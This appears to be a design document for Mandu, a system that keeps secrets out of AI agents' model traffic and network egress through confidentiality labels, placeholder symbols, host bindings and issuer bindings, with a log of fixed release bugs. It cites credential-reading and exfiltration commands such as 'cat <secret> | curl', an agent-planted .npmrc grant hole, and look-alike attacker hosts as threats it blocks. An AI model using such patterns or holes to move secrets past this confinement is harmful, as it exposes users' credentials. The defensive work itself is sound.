# Mandu — Confidentiality: the second lattice

> **Default since 2026-09-21: ON.** The product's built-in mode is `secrets`
> (this axis ON, integrity OFF); `--confidentiality` below reads as "the
> confidentiality axis is ON", which is what a flagless launch runs. The
> axis is chosen by the protection mode (`--mode`, `mandu mode`, the
> dashboard's Protection drawer): [protection-modes.md](../architecture/protection-modes.md).

> **Status (2026-10-03): BUILT on Linux; macOS experimental, `read-blocked`.**
> With the axis ON, secret file content never reaches the model wire raw
> (even when integrity-TRUSTED), and no secret symbol is released to a
> network destination, the U-LLM, or a HumanShell argv without a logged
> human decision, except at its bound destination. Built: the 2×4 label and
> the default-secret catalog (§2, §6), the egress gate and U-LLM exclusion
> (§3.2, §7), the labeling store and UI (§6), the quarantined read and the
> session high-watermark (§3.3, §4), on-disk labels for derived files (§8),
> the fourth level `local-model` with declared model endpoints (§3.5), and
> unprivileged secret confinement: the arbiter pre-symbolizes each
> registered credential and a symbolized **twin** replaces it in the
> agent's world, so `cat ~/.aws/credentials` yields a symbol and
> `cat <secret> | curl …` carries a token (§7.2, §7.2a). Programs that need
> the raw bytes get them as named readers whose outputs carry the label
> ([`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)).
> Where the host cannot confine, the launch runs in the named, weaker
> **`gated`** posture with a loud notice, and `--require-confinement`
> refuses instead (§10.1,
> [`rootless-confinement-ubuntu-2404.md`](./rootless-confinement-ubuntu-2404.md)).
>
> **Open:** the per-level **leakage benchmark** (§12); **Purview/MIP label
> ingestion** (§6); the kernel-tier valve of §7.1 (**deferred**, not
> dropped: it needs only the exec-supervisor's per-exec mount interception
> through an *unprivileged* userns, so it is not in the host-root class
> ruled out for good in privilege-model.md §0; triggers in §11); and
> **fresh macOS validation of the integrated branch** (§7.3). Earlier
> hardware results below belong to the macOS branch, not this integration.
>
> Companion to [`mandu.md`](../architecture/mandu.md) (the integrity design
> this dualizes), [`exec-routing.md`](../integrity/exec-routing.md) (the
> asymmetric world §7.1 generalizes), and the
> [`fs-provenance`](../integrity/fs-provenance.md) series (the lineage
> machinery §8 reuses). Paper terms are paired with repo terms per
> `mandu.md` §8.
>
> **`local-model` (complete 2026-09-28).** A fourth level, between
> `any-model` and `no-model`, that only a model you run yourself may read:
> `models:` in `policy.yaml` declares endpoints, each `local: true` or not,
> and everything undeclared is external. The quarantined read admits the
> level only at a declared local endpoint; the in-context read admits it
> only when the session's main model is a declared local entry, bound once
> at launch (§3.5,
> [`model-endpoints.md`](./model-endpoints.md)).
> The level names say which models may read the content; the retired
> spellings (`model-ok`, `strict`, …) are refused at policy load.
>
> The plan in one line: label every file at one of **four confidentiality
> levels** (`public`; `any-model`: any model may read it, the outside
> world may not; `local-model`: only a model you declared as your own may
> read it, no outside model and no outside world; `no-model`: neither any
> model nor the outside world may read it), composed with the existing
> two-level integrity label into one **2×4 label** on the symbol table, and
> gate every egress on the label's own release rules. The user freely
> mixes secret data with untrusted data in one task; secret data never
> leaks past its level, by design.
>
> Earlier drafts framed this as two provider trust models ("Mode C" /
> "Mode P") plus a general `clearance(endpoint)` relation decided per
> label × endpoint. **The levels replace that machinery**: the one
> clearance question that matters in practice ("may the model provider read
> this?") is folded into the label itself. §3.4 gives the mapping.

## 1. The inversion

Everything Mandu enforces on the integrity axis is the **integrity** half of
information-flow control: low-integrity (UNTRUSTED) data must not influence
privileged decisions. This document adds the **confidentiality** half:
high-confidentiality (SECRET) data must not flow to low sinks.

> **Integrity protects the model from the world; confidentiality protects the
> world's data from the model.**

*How far* that inversion goes is a per-file question: is the model provider
allowed to read this datum (a cleared reader) or not (one more untrusted
sink)? The label answers it; that is the whole design.

## 2. The label model — 2×4, one table

Do **not** model the confidentiality levels as parallel symbol species. A
datum can be **both** untrusted and secret (a downloaded credential, a
customer-supplied key); it needs one symbol, one table row, one composed
label:

```ts
label: {
  integrity:       "trusted" | "untrusted",
  confidentiality: "public" | "any-model" | "local-model" | "no-model"
}
```

- **Total order on the new axis:**
  `public ⊑ any-model ⊑ local-model ⊑ no-model`. Each level's
  restriction set strictly contains the previous one's (`public` restricts
  nothing; `any-model` restricts {outside}; `local-model` restricts
  {outside, external models}; `no-model` restricts {outside, every model}).
  Fail-closed is therefore unambiguous: arbiter unreachable, classification
  uncertain, an unknown stored value, or catalog match ⇒ treat as
  `no-model`. Nothing ever defaults to `any-model` or `local-model`; the
  catalog mints only `public` and `no-model`.
- **Per-datum release bindings.** A secret label may carry an explicit list
  of *bound destinations*: the exact sinks this datum is for (the API
  host a key authenticates to, the org's document store for a contract).
  Bindings are the only external releases a `no-model` datum ever gets (§3.2),
  and they are per-datum metadata, not a policy relation. The default catalog
  adds one kind (§2.3, 2026-10-19): a key whose own format names its
  issuer is bound to that issuer's exact API host, in the `Authorization`
  header over HTTPS only. A structured file
  may bind each VALUE on its own (`values:`, 2026-10-11, confidentiality
  plan 13 §5.2): a value's symbol is released at its own value's bindings,
  and the file taken whole (a raw holder, a copy, the whole-file symbol) at
  the intersection of the file's and every value's.
- **A row's bindings follow the label law in force (§2.1).** The symbol
  table stores each row's `bindings`, but the human's label decides them,
  not the moment the row was minted.

### 2.1 Bindings are the law in force, not the law at mint (2026-10-05)

A symbol row stores `bindings`, the hosts the egress gate releases it to.
Until 2026-10-05 the column was written once, when the row was minted from
its origin path's label, and a later registration of the same unchanged file
reused the row by value without touching it
(`arbiter/secret-registry/registry.ts` `registerSecret`, `findReusableSymbol`).
Two consequences, found while writing the first-session tutorial
(`docs/getting-started.md` §5-7: read `.env`, then bind its key, then use it):

- a binding **added** after Mandu first saw a file never reached that file's
  symbols: a send to the now-bound host stayed held as
  `egress:secret-unbound`, while `mandu why <file> --to <host>`, which
  derives from the current label, said "released
  (`egress:secret-bound-trusted`)". Fail-closed, but the flow was dead;
- a binding **removed** kept releasing every symbol minted under it, for the
  life of the symbol table: a stale standing release, the security-relevant
  direction.

The rule now (`arbiter/secret-registry/current-bindings.ts`):

1. **A registered file's own rows** (its base row and field rows,
   `isRegisteredFileRow`, no lineage) carry **exactly** the current label's
   bindings for their origin path (under `values:`, a field row its own
   values' bindings and the base row the whole file's, plan 13 §5.2), plus a field's own wire grant (plan 10
   §11.13.1: a field of the launch HOME's `.npmrc` / `pip.conf` keeps the
   registry its own text names, a grant the registration gives the field
   alone, never the base row, and records, `wire_grants`; see "The wire
   grant is recorded" below), plus a launch's auth grant (an agent's own
   key file's field bound to the provider host the launch routes, given on
   the human plane and held in the arbiter's memory,
   [`agent-sign-in.md`](../agents/agent-sign-in.md) §3). Both directions: an
   added binding releases at once, a removed one stops releasing at once.
2. **Every other secret row that refers to something** (its `derived_from`
   parent, the recorded sources of a multi-input join, an origin that is
   itself a symbol, an origin that is an absolute path, or a command's
   text; see the second pass below) is **intersected** with that
   reference's current bindings. It only ever
   narrows: such a row may have been minted narrower than its reference (a
   multi-source join, `source-label.ts`; a client's own `bindings`), so it is
   never widened, and a binding added later reaches the next copy, not this
   one (fail-closed). A binding removed from a source leaves every copy at
   once, the plan 13 §4.6 by-reference rule applied to symbols. A path that no
   longer classifies secret (its label removed or lowered to `public`) is
   bound nowhere, as §4.6 rules for a derived file's source.
3. **A masked environment variable's row** (`env:NAME`) carries **exactly**
   the hosts the law in force binds NAME to, plus its own value's wire
   host, both directions (the second pass below).

Then every high session's bindings are re-derived from the rows it read
(§4, the second pass below).

The arbiter applies the rules (to a fixpoint: a registered derived file's
rows refer to its sources' rows) whenever the label law changes, keyed on
the compiled policy object, the label store's version and the derived-label
generation (`server.ts` `syncSymbolBindings`), before it answers any
request: a policy swap (an approved hand edit, a dashboard act), a label set
or removed, a derived-label write, and a restart (the first request after
start). `registerSecret` applies rule 1 to its own path before it reuses a
row, and `registerEnvSecret` gives a reused row the bindings of the launch
registering it (the law's `env.sources` / `models[].token_env` in force).
Changed rows are persisted and bump the map's generation, so the DB, the
value index (prompt filter), the fingerprint tripwire, the registry listing
and the gate all read the same bindings.

One writer of the law had leaned on the stale column: a reader pin (plan 10
§11.2, `server.ts` `pinReader`) on a file that a **pattern** or an ancestor
labels writes the file's own entry, which outranks that label from then on,
and wrote it as a bare `{path, level, readers: [pin]}`, dropping the
pattern's `bindings`, `others`, `extract` and other readers for that file.
The mint-time bindings on the symbol rows hid it; with rows following the
law, the first pin would have stopped a bound key reaching its own host
(caught by the `https-proxy-taint` sandbox suite). The new entry now
carries what the deciding human label gave the file
(`arbiter/test/component/script-reader-pin.test.ts`).

**The second pass (2026-10-05): the same stale release, where the first did
not reach.** The first pass left four places that kept a binding the law no
longer granted; three of them kept releasing after a removal, confirmed by
`tests/stack/session-bindings-follow-policy.test.ts` before the fix:

- **The session high-watermark (§4).** `SessionLabelStore.raise` copied the
  read symbol's bindings into the session's label when the session read a
  file into context, and nothing re-derived them: after a binding was
  removed (a hand edit, a dashboard label act, or while the arbiter was
  down), the session could still send a *paraphrase* of the secret, which
  carries no symbol for the per-symbol gate, to the old host. The store now
  records the symbols each session read (`session_label_sources`), and the
  same sync sets every high session's bindings to the intersection of those
  rows' bindings as they now stand (`rederive`, after the rows are synced).
  This one **widens** as well as narrows, deliberately: the session is bound
  where every datum it read may go, and when the law lets all of them go to
  a host, a paraphrase of them may go there too. It never widens past what
  every source allows, and the sources' own rows follow rules 1 to 3, so a
  copy that never widens keeps the session narrow too. A source it cannot
  read (a row gone or obsoleted, a `raise` with no symbol, a high session
  recorded before the table existed) binds the session nowhere: after an
  upgrade, a session high at the time asks for each egress until it ends.
- **A masked environment variable** (rule 3). Its row's bindings used to
  change only when the next launch registered the variable again. The sync
  now gives an `env:NAME` row exactly the hosts the law in force binds NAME
  to (`env.sources[].bindings`, the hosts of the `models[]` whose
  `token_env` it is) plus the wire host its own value named at registration
  (a pip index URL's host, plan 10 §11.13.1), both directions. The row
  keeps no URL, so the arbiter keeps that host from the registration:
  recorded in `wire_grants` when the launcher registered it on the human
  plane (since 2026-10-17, "The wire grant is recorded" below), in memory
  only when the registration came over the data socket.
- **A command-text row whose label is removed entirely.** Rule 2 used to
  leave such a row alone when no human or derived label matched its text
  any more, so the bindings minted under the removed label kept releasing.
  It now reads the text exactly as its mint did (no call directory), so an
  unchanged law gives the row back its bindings, and a text no label
  matches is bound nowhere: no production client sends a row's own
  `bindings`, so a bound command row's bindings came from a label. A URL
  origin, which no label ever matches, is still not a reference.
- **A multi-input inspection result** (`symbolizeDerived`). The row records
  one parent (its first input), so a binding removed from another input
  never reached it. Its whole source list is now recorded
  (`symbol_sources`, `arbiter/symbol-table/symbol-sources.ts`), and rule 2
  intersects the row with the join of those sources as they stand now
  (`source-label.ts`, the join that minted it); a source gone binds it
  nowhere. Such a row is untrusted, so the stale binding only changed which
  question the egress gate asked, but a session that read it into context
  took its bindings as a standing release. Rows minted before the table
  existed keep their mint-time join (still narrowed by their origin and
  parent).

Both new tables are whole tables in mandu.db (schema v8, which adopts v5 to
v7 files).

**The wire grant is recorded (2026-10-17).** Rule 1 used to tell a field's
wire grant from a label's binding by inference: a field row of a `.npmrc` or
`pip.conf` kept the host its own text names when the row held that host and
its base row did not. The base row and the field row hold the same label
bindings, so the inference failed in both directions:

- **A grant lost with a label binding on the same host.** A HOME `.npmrc`
  whose label also bound `registry.npmjs.org`: both rows held the host, so
  when the user removed the label binding the sync took the grant with it,
  and npm's token was held at its own registry until the next launch's
  registration gave the grant back. Fail-closed, but it made the grant
  depend on whether the label had happened to name the same host, which it
  never should: with no label binding there, the grant stays.
- **A user's binding kept as a grant (security fix).** Under `values:`
  (plan 13 §5.2) a field row carries its own value's bindings and the base
  row the whole file's, so a `values:` entry binding a workspace `.npmrc`
  token to the registry its text names (or a `pip.conf` index password to
  its index) put a host on the field that the base row lacked: exactly what
  the inference took for a wire grant. When the user removed the entry, the
  sync kept the host, and the row then held it, so every later sync, restart
  and launch kept it too: a binding the human removed kept releasing the
  token to that host, for a workspace file the registration never grants
  anything (the agent can write it). `tests/stack/wire-grant-recorded.test.ts`
  showed it through the real arbiter before the fix.

The registration now records each grant it gives (`wire_grants` in
mandu.db, field row → host, symbol-table.ts `recordWireGrant`; the launch
HOME's own `.npmrc` / pip.conf only, `isHomeWireFile`, and since
2026-10-21 an editor's MCP config in that HOME, whose HTTP server's
Authorization credential goes to its entry's own host
([`secret-discovery.md`](./secret-discovery.md) §2.10; never
`~/.claude.json`, Codex's `config.toml` or a workspace config), and only for a
registration on the human plane, below), and rule 1 adds a
field's wire host when, and only when, the record names it and the field's
own text still names that host. The precedence is explicit:

| The field's host comes from | Kept when | Removed when |
|---|---|---|
| the label (`bindings:`, a `values:` entry) | the label in force names it | the label stops naming it, at once |
| the wire grant (recorded at registration) | always, while the row lives and its text names that host | never by a label act; a new file version mints new rows, obsoleting the old |
| both | either source keeps it | both are gone |

A label binding never adds a grant and never takes one away: removing the
registry from a HOME `.npmrc` label leaves the token bound there by the
grant, which the egress gate puts back in the `Authorization` header only
(plan 10 §11.13.1, `releaseRestsOnWireGrant` reads the label, so the host
becomes automatic again). There is no user act that revokes the grant
itself; `MANDU_WIRE_TWIN=0` and a `.npmrc` other than the launch HOME's
are the ways not to have one, as before. A row minted before the table
existed (a file adopted from schema v15 or earlier) has no record and keeps no grant
until the next launch's registration records it (fail-closed): its token is
held at its registry until then.

**A high session from before the upgrade stays bound nowhere (decided
2026-10-17).** "Upgrade" is the step to schema v8 (2026-10-05), which added
`session_label_sources`; a file adopted from v5 to v7 has high sessions with
no recorded source, and `SessionLabelStore` gives each the unknown source,
so the session asks for each egress until it ends. Re-binding it at the
arbiter's start was considered and refused: the only state such a session
recorded is the bindings it copied at the read, the mint-time list this
second pass exists to distrust (a binding removed since, by a hand edit or
while the arbiter was down, is still in it), and nothing records which file
it read, so no current law can be intersected with it. The loss is one
session's convenience, once, and ends with the session; the fail-closed
answer stays.

**A pip index variable's grant is recorded too (2026-10-17).** Rule 3's
wire host (`PIP_INDEX_URL` / `PIP_EXTRA_INDEX_URL`: the password bound to
the index host its own URL names, `envSecretSpan`) was held in the
arbiter's memory only, so an arbiter restarted under a live session dropped
it and pip's password was held at its own index until the next launch
registered the variable again. The eligibility is unchanged (the same
variables, the same URL rule, the same value); what changed is where the
host is kept, by the plane the registration came over:

- **the human plane** (the launcher, which now sends `registerEnvSecrets`
  over the human socket when the arbiter reported one): the host is
  RECORDED in `wire_grants` under the env row's symbol and read back on
  start, so the grant survives a restart. One host per row: a later
  registration of the same password at another index replaces it, as the
  memory map did;
- **the data plane** (a launcher with no human socket, or any process of
  the agent's world, which can reach that socket): memory only, as every
  registration was before. A grant the agent's world earned this way binds
  only a value it supplied itself, and it never outlives the arbiter.

The record follows the row: an obsoleted row loses it (`obsoleteSymbol`,
for a file's field row as well). It is a grant, not a binding of the
user's: an `env.sources` binding removed from the law leaves the row at
once and after a restart, while the grant stays, and the gate puts a
release that rests on it back in the `Authorization` header only
(`releaseRestsOnWireGrant`). No schema change: the rows are new rows of the
v16 table, whose shape is unchanged (a v16 build ignores a record whose row
is not a registered file's). `tests/stack/env-wire-grant-recorded.test.ts`
showed the restart drop through the real arbiter before the fix.

**A HOME file's grant only from the human plane (2026-10-17).** Which
directory is the launch HOME was the caller's word: `registerSecret` takes
a `home`, and gave the grant to a `.npmrc` / pip.conf at that `home` over
either socket. The data socket is one the agent's world can reach, so a
process there could write a `.npmrc` naming a registry of its choosing in
a directory of its choosing, name that directory as `home`, and earn a
recorded, standing release of the file's token at that registry: a grant
for a source the agent sets, which the rule is meant never to give (the
token was text the caller wrote itself, so nothing of the user's leaked,
but the release stood across restarts). Now a `registerSecret` on the data
socket is ACCEPTED with no grant (`wireGrant: false`): the file is
registered and twinned as before, its `home` still decides the catalog's
`~` places, and it neither gives nor records a grant, nor takes away one a
human-plane registration recorded. Refusing a `home` there was the other
choice; it would have broken the launcher's fallback (an arbiter that
reports no human socket) and every data-socket caller that names a `home`
for the catalog, so it was not taken. The launcher registers over the human
socket when the arbiter reported one (`socketSecretArbiter`), so the HOME
`.npmrc` keeps its grant; with no human socket it falls back to the data
socket and the file has no grant: npm's token is held at its registry and
npm reads the real file as a confined reader, as with `MANDU_WIRE_TWIN=0`
(fail-closed). `tests/stack/home-grant-human-plane.test.ts` showed the
planted grant before the fix.

**A session's HOME is its launcher's word on the human plane
(2026-10-17).** The open decision (`decideSecretOpen`) and the classify
derivation judged the catalog's `~` places by the ARBITER's HOME, so a
launch under another HOME (`HOME=/tmp/x mandu …`) had its HOME's files
judged by places that named none of them: every program, ssh included, got
the twin of a key in `/tmp/x/.ssh` (fail-safe, but no login). The launcher
now names its HOME in its `beginLaunch` record (`home`, with the session),
which the arbiter keeps only from an attested request and drops at
`endLaunch`; both judge a path by that HOME and by their own, the stricter
deciding, so a launch HOME only adds places. A `home` on the data socket
names no session's HOME (plan 10 §11.13). The twin a registered file
makes is read the same way wherever it is answered (`twinMatchOf`: the
whole-file read and exec-output legs, `mandu why`), and `mandu why <file>`
on the human plane judges under the newest running launch's HOME (or
`--session`'s) and names it (plan 10 §11.13, "`mandu why` and the
whole-file legs under a launch HOME").

**One value, several sources (2026-10-19).** Two labelled files holding the
SAME value (a card number in `my-details.yaml` and in `wallet.yaml`, a key in
`.env` and in `deploy.yaml`) mint two rows, each carrying its own file's law
(rule 1). Whatever names the value later picks one of them: the prompt
filter masks a page's or a prompt's copy as the strictest row holding it
and, on a tie, the first registered (plan 15 §4.1); the egress tripwire
judged each row alone. So the file registered first decided, and the other
file's bindings were silently ignored: found building the browser demos,
where the expense tool was refused the company card because the car demo's
file, bound to the vehicle registry only, came first. Fail-closed, but not
what the user stated. The rule now (`arbiter/secret-registry/value-sources.ts`):
a SOURCE row (a registered file's own row, or a masked environment
variable's) is judged with every other live source row holding the identical
value, its siblings:

- its **level** is the strictest of theirs. The quarantined helper's deep
  resolve, the in-context read (rung 3) and the egress gate read it, so a
  model one source admits and another does not is not cleared. Every live
  sibling counts, whatever its file holds today: a level only narrows.
  Before this rule, a file labelled `any-model` released to the helper's
  model a value another file labels `no-model` (a hole in the invariant,
  closed by the same change);
- its **bindings** are its own plus each sibling's DECLARED bindings (the
  label's `bindings:` or `values:` entry for that row, `env.sources` for an
  env row): the union. The egress gate (the net-proxy's fill, the DevTools
  relay's typing), the tripwire and the upload gate's value hits read it.

Why the union widens nothing the user did not state: a binding is the user's
explicit allow for the values of that source to that destination. Every host
in the union is one that a live, trusted, user-labelled row holding exactly
these bytes is bound to under the law in force, so the union releases the
value nowhere that sibling's own placeholder is not released already. What
keeps it from going further:

- only source rows give or get it: a row minted from a tool result, a
  derived copy or the prompt filter's own mint gains no host from another
  row, and gives none;
- only declared hosts cross: a sibling's automatic hosts (a wire grant, an
  auth grant) stay with that row, so the wire rules (§11.13.1 of plan 10:
  https only, the Authorization header only) cannot be escaped through a
  sibling. A host the row holds by a wire grant that a sibling DECLARES is
  the user's binding, so the position rule does not hold it to the header;
- a file sibling gives its bindings only while its file still holds the
  value (read back from disk, at most 4 MiB): a file edited or deleted
  stops speaking for a value it no longer holds, and unlabelling it empties
  its declared bindings at once, while the other file's own binding stays;
- it is per value: a raw holder of a whole file and a high session keep
  their own file's bindings (holder-send-ask, §4), since they hold that
  file's other values too.

Nothing is stored: the view is computed from the rows and the law at each
decision, so it follows a label change at once and an arbiter restart
rebuilds it from the SQLite rows. `arbiter/test/unit/value-sources.test.ts`
(both registration orders, the strictest level, each way of removing a
source, a restart) and `tests/stack/bindings-across-files.test.ts` (the real
net-proxy, the DevTools relay and the helper's resolve, failing before the
fix) pin it.

What it still does not cover: a copy (rule 2) never widens, so a binding
added to its source reaches the next copy, not this one.
- **Wire markers are presentation, the table is authoritative.** The
  handling prompt instructs the model differently per level, so a secret
  symbol's *name* carries a reserved tag marker inside the `$MDU:` grammar:
  `$MDU:nomodel_<tool>[hash]` (no-model), `$MDU:localmodel_<tool>[hash]`
  (local-model), `$MDU:anymodel_<tool>[hash]` (any-model). Every decision
  reads the table row, never the name. The in-grammar marker is deliberate:
  the tag slot is `[a-zA-Z_][a-zA-Z0-9_]*`, so every symbol scanner in every
  package (the proxies, net egress, the exec detectors, the SSE
  delta-repack guard) matches the one `$MDU:` token family unchanged, and
  `shortToolTag` reserves the `nomodel_`, `localmodel_` and `anymodel_`
  prefixes so a real tool name cannot forge a marker.
- **The axis values are strings** so levels and compartments can extend
  later (§13.5) without another schema upheaval.
- The session record (per-session in the arbiter) carries a floating
  `sessionLabel`: the high-watermark state (§4).

### 2.2 What a binding admits: one rule (2026-10-11)

Every check that asks "may this go to that host" answers by one rule,
`arbiter/policy/host-bindings.ts`:

| Binding | Admits |
|---|---|
| `example.com` | `example.com` and every host under it (`api.example.com`) |
| `*.example.com` | every host under `example.com`, not `example.com` itself |
| `host:443` | as above, on port 443 only |
| `10.1.2.3`, `[::1]` (`:port` optional) | that address only (IPv6 compared as an address: `[2001:DB8::1]` is `[2001:db8:0::1]`) |
| `[fe80::1%eth0]` (a zone id) | nothing |
| `10.0.0.0/8` | no host name (an address range is the guard's, which sees addresses) |
| `unix:…`, `mount:…`, `*` | no network destination (their own legs compare them by equality) |

Names are case-insensitive, a trailing dot is dropped, and "under" goes by
whole labels: `evil-example.com` is not under `example.com`. A destination
may be a host, `host:port` or a URL; one that names no port matches a
binding with a port (the caller did not say which port). **The port.** A
binding with no port admits every port of what it names, the default ports
and any other; one with a port admits that port only. The same holds for the
wire grants a registration gives (plan 10 §11.13.1): `//registry:8443/` in
`.npmrc` or `https://u:p@index:8443/simple` in `pip.conf` grants that port
only, a URL with no port every port. The egress proxy therefore states the
port of every destination it judges (`interceptors/net-proxy/src/destination.ts`,
2026-10-17): the TLS-inspected leg and the blind tunnel the CONNECT
target's (`host:8443`, `[2001:db8::1]:443`), the plain-HTTP leg the URL's or
its scheme's default (`host:80`). Until then the inspected leg and the
tunnel stated the CONNECT host alone and the plain leg dropped a default
port, so a value bound or granted to `host:8443` was also put back at
`host:443`, and a holder of a file bound to `host:8443` could open a tunnel
to any port of it. A caller that cannot know the port (the model proxies'
provider host, whose grants carry none) still states none. The human's
answers about a send (the Approvals rows of a symbol, a session's network
question) are keyed by the destination less a default port
(`session-approvals.ts` `approvalDestination`: `host:443` and `host:80` are
`host`), so an answer given where the host alone was named (a model
proxy's pre-check of a WebFetch, an answer from before) applies to the
proxy's send at either default port, and one at `host:8443` only there; a
holder's question keeps the port as stated. The holder join (plan 13 D1) keeps a binding when every
file's list covers it by the same rule (`bindingCovers`: a host covers the
names and `*.`s under it, `*.x` only those strictly under `x`, a port only
that port), so what it keeps is what every file admits.

The users of the rule: the egress gate (`destinationMatchesBindings`), the
holder join (`intersectBindings`), the holder-send question
(`holder-send-ask.ts`), the session sinks (`destinationIsBound`), and the
net-proxy's holder check (`hostIsBound`), which keeps an identical copy
(`interceptors/net-proxy/src/host-bindings.ts`; it does not import the
arbiter) that `tests/stack/host-binding-parity.test.ts` holds to this one
line for line. The kernel guard decides by address: it resolves each name in
a holder's list and admits a connect to those addresses, so a bare name
there admits that host's addresses, not its subdomains', and a `*.x` admits
what its literal name resolves to (usually nothing; a send through the
proxy is judged by name).

Until 2026-10-11 the four disagreed: the gate read `*.amazonaws.com` as a
literal name, so it released nothing, and ignored ports, so a value bound to
`db.internal:5432` was released at any port of `db.internal`; the join read a
bare host as that host only (a holder of files bound to `example.com` and to
`api.example.com` could send nowhere); the net-proxy let `*.x` admit `x`
itself. All but the port case refused more than the label allows; the port
case released at a port the user did not name.

### 2.3 Issuer bindings: a key's own format binds it to its issuer (2026-10-19)

**The change to the default, stated plainly.** On a fresh install, with no
label and no binding of the user's, a secret now leaves the machine with no
Approvals card in exactly one case beyond §2.2's: a value from the user's
own files or environment **whose format names the service that issued it**
is put back in a request to **that issuer's documented API host**, over
HTTPS, in the request's own `Authorization` header, as if a binding of the
user's bound it there. The table below is the whole list. Everything else
asks as before: any other host, any other place in the request, any other
value, any copy of the value. Built in
`arbiter/policy/issuer-bindings.ts` (the table and the match), the gate's
composition in `arbiter/ipc/server.ts` (`issuerReleaseOf`, inside
`decideDesym`) and the row rule in
`arbiter/secret-registry/current-bindings.ts` (`issuerSourceOf`); the
decision's rule is `egress:secret-issuer`.

**Why.** The head-to-head of 19 October (comparisons.md §5) ran fifteen
everyday tasks three times each on a fresh install. Mandu kept the secret in
45 of 45 sessions and finished 41, but the scripted person answered 42
Approvals cards over the 45, while the protections Mandu was compared with
never ask. A person on a fresh install answers *always* the first time Mandu
asks whether their Stripe key may go to Stripe; the card tells them nothing
they did not know. Nine tasks asked such a question once per take; two of
them (c5, the Stripe key to `api.stripe.com`; c6, the Notion token to
`api.notion.com`) ask about the key's own issuer, and this section removes
those two: 6 of the 42 cards (expected 36 after this change; the battery has
not been re-run, and no live run was spent on this). The other seven ask
about a host no format can name and keep asking (below).

**The table** (each host from the issuer's own API documentation; the
`docs` field of each row in `issuer-bindings.ts` cites it):

| Issuer (`issuers_off` id) | Key format, matched over the whole value | Hosts, exactly | Source |
|---|---|---|---|
| Stripe (`stripe`) | `sk_live_`, `sk_test_`, `rk_live_`, `rk_test_` + 20 to 247 letters and digits | `api.stripe.com`, `files.stripe.com` | docs.stripe.com/api (the base URL; the key as the Basic user or a Bearer token); docs.stripe.com/api/files/create (`https://files.stripe.com/v1/files`) |
| GitHub (`github`) | `ghp_`, `gho_`, `ghu_`, `ghs_` + 36 or more letters and digits; `github_pat_` + 50 or more | `api.github.com`, `uploads.github.com` | docs.github.com: REST authentication (`Authorization: Bearer`); release assets (`https://uploads.github.com/…/assets`) |
| Notion (`notion`) | `ntn_` + 40 to 64 letters and digits | `api.notion.com` | developers.notion.com/reference/authentication (`Authorization: Bearer`) |
| OpenAI (`openai`) | `sk-proj-`, `sk-svcacct-`, `sk-admin-` + 20 or more | `api.openai.com` | platform.openai.com/docs/api-reference/authentication |
| Slack (`slack`) | `xoxb-`, `xoxp-` + 20 or more | `slack.com` | docs.slack.dev/apis/web-api (`https://slack.com/api/…`, the token preferred in `Authorization`) |
| npm (`npm`) | `npm_` + 36 letters and digits | `registry.npmjs.org` | docs.npmjs.com/cli/using-npm/registry |
| PyPI (`pypi`) | `pypi-AgEIcHlwaS5vcmc` (the token's `pypi.org` caveat) + 50 or more | `upload.pypi.org` | docs.pypi.org/api/upload (`https://upload.pypi.org/legacy/`); pypi.org/help/#apitoken (`__token__` in Basic) |
| Hugging Face (`huggingface`) | `hf_` + 34 letters and digits | `huggingface.co`, `router.huggingface.co` | huggingface.co/docs/hub/security-tokens; huggingface.co/docs/inference-providers (`https://router.huggingface.co/v1`, `Authorization: Bearer`) |
| SendGrid (`sendgrid`) | `SG.` + 22 + `.` + 43 | `api.sendgrid.com` | twilio.com/docs/sendgrid/api-reference (v3 authentication, `Authorization: Bearer`) |

**Left out on purpose**, each for a reason that is not "not yet":

- **Anthropic** (`sk-ant-…`): its API takes the key in `x-api-key`, outside
  the one header the position rule trusts, so a release could never apply;
  and the agent's own sign-in is never masked in the first place
  ([`agent-sign-in.md`](../agents/agent-sign-in.md)).
- **AWS** access keys: SigV4 signs the request with the secret key on this
  machine; the secret never travels, so no placeholder can be put back (a
  program signing with the placeholder makes a wrong signature). Nothing to
  bind.
- **Twilio**: the auth token (and an API key's secret) is 32 hex digits
  with no prefix; its format names no one.
- **GitLab** (`glpat-…`): a token may be a self-managed instance's, whose
  host no format names; binding every `glpat-` to `gitlab.com` would send a
  company instance's token to the public service.
- **Google API keys** (`AIza…`): dozens of hosts under `googleapis.com`,
  and the key usually in the URL. A suffix rule is exactly what this
  section refuses.
- **Notion's legacy `secret_…` tokens**: the prefix names no issuer.
- **GitHub refresh tokens** (`ghr_…`) go in a request body to `github.com`.

A new row needs all four: a prefix the issuer owns, a documented API that
takes the key in `Authorization`, a fixed set of hosts the issuer's own
documentation names, and its rows in the unit test.

**Exactly what must hold** (`issuerRelease` and `issuerSourceOf`, every one
required):

1. **The row is the user's own source.** A registered file's own field row
   (no lineage, trusted, active) whose deciding label is the catalog's, its
   content tier's or the user's (never a derived label: a file a high
   session wrote holds values the agent's world composed), and not a field
   found in a comment line (an old key the human never thought of goes
   nowhere, §2.1), and not an AI agent's own login or key file (Codex's or
   OpenCode's `auth.json`, Claude Code's `.credentials.json` and
   `.claude.json`, Goose's `secrets.yaml`, the SDKs' `~/.anthropic` and
   `~/.openai`, wherever moved: `isAgentCredentialPath`), whose key reaches
   its provider only through the launch's auth grant, which ends with the
   launch ([`agent-sign-in.md`](../agents/agent-sign-in.md) §3; found by
   `tests/stack/auth-substitution.test.ts`, where an ended launch's Goose
   key went to `api.openai.com` again); or a masked environment variable's
   whole-value row. Never
   a whole-file placeholder, a copy, a derived or joined row, a tool
   result's mint or the prompt filter's: those ask.
2. **The value names one issuer.** Its format matches over the WHOLE value
   (anchored, a fixed body alphabet and length); a prefix alone never
   matches, and a value two formats matched would name no issuer (none
   does today; the rule keeps it so).
3. **The host is that issuer's, exactly.** Case folded and a trailing dot
   dropped, and nothing else: no suffix or subdomain rule (§2.2's "a host
   covers the hosts under it" is NOT used here), no address, port 443 or
   none stated. `api.stripe.com.evil.io`, `api-stripe.com`,
   `x.api.stripe.com`, `stripe.com`, `api.stripe.com:8443` and
   `http://api.stripe.com` all miss and ask. A key goes only to its own
   issuer: the Notion token at `api.stripe.com` asks.
4. **HTTPS, and the `Authorization` header only.** The egress proxy states
   the scheme and every place the placeholder sits (plan 10 §11.13.1); the
   release needs `https` and every position `authorization` (the header's
   text or its decoded Basic pair). A key in the body, the URL or another
   header, or a request whose scheme or positions are not stated, asks, at
   the issuer's host too. This is narrower than a binding of the user's,
   which releases wherever the placeholder sits (§2.2).
5. **The switch is on and nothing the human said overrides it.** It runs
   after every standing answer about the placeholder, after the human's
   answer about its file at that host (egress-hold.md "One card per file"),
